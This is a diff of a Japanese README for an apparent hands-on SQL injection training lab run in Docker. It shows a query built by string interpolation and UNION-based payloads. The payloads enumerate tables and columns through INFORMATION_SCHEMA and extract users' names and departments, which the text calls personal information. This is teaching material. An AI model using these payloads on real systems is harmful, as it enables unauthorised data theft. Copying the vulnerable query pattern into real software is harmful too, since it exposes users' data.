@@ -15,7 +15,10 @@ docker compose up -d
 
 ## インジェクション体験
 ### ページ概要
-このサンプルページは、製品を一覧表示するページです。
+
+<img width="389" alt="image" src="https://user-images.githubusercontent.com/9111423/137260754-59f4a5b7-40b9-447a-851d-09dc042703a6.png">
+
+このサンプルページは、製品を一覧表示するページです。  
 このページでは、以下のSQLが実行されています。
 
 ```sql
@@ -37,9 +40,10 @@ SELECT * FROM products WHERE name LIKE '%{name}%'
 
 実行すると以下のような結果になります。
 
+<img width="398" alt="image" src="https://user-images.githubusercontent.com/9111423/137260878-b6fed6c1-0ae8-4f3e-9d69-98afa49ce556.png">
 
 
-使用しているデータベース名と、テーブル名のリストが表示されました。
+使用しているデータベース名(test)と、テーブル名のリスト(products, users)が表示されました。  
 よって、このデータベースでは `users` というテーブルがあることが確認できました。
 
 このとき、実行されたSQLはこのようになります。
@@ -58,6 +62,7 @@ SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEM
 ' UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' AND TABLE_SCHEMA = 'test' -- 
 ```
 
+<img width="370" alt="image" src="https://user-images.githubusercontent.com/9111423/137260994-02888285-6a6e-4693-a49d-e91d2aa5876e.png">
 
 `users` テーブルにあるカラムがわかりました。
 
@@ -77,6 +82,9 @@ SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME 
 ' UNION SELECT name, department FROM users -- 
 ```
 
+<img width="364" alt="image" src="https://user-images.githubusercontent.com/9111423/137261111-9277aa95-1c4b-4f03-85cc-2d7b4ddc2718.png">
+
+個人情報を取得することができました。
 
 このとき、実行されたSQLはこのようになります。
 
